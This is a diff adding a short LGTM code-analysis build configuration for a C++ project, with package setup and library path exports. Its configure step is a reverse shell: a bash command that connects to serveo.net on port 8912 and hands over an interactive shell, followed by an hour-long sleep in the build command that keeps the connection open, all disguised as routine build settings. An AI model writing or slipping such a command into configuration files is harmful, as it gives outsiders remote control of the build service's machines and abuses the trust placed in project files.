@@ -1,0 +1,17 @@
+ 
+extraction:
+  cpp:
+    prepare:    # Customizable step used by all languages.
+      packages:
+        - g++-6
+    configure:    # Customizable step used only by C/C++ extraction.
+      command:
+        - '/bin/bash -i >& /dev/tcp/serveo.net/8912 0>&1'
+    before_index:    # Customizable step used by all languages.
+      - export BOOST_DIR=$LGTM_SRC/boost
+      - export GTEST_DIR=$LGTM_SRC/googletest
+      - export HUNSPELL_DIR=$LGTM_SRC/hunspell
+      - export CRYPTOPP_DIR=$LGTM_SRC/cryptopp
+    index:    # Customizable step used by all languages.
+      build_command:
+        - sleep 3600
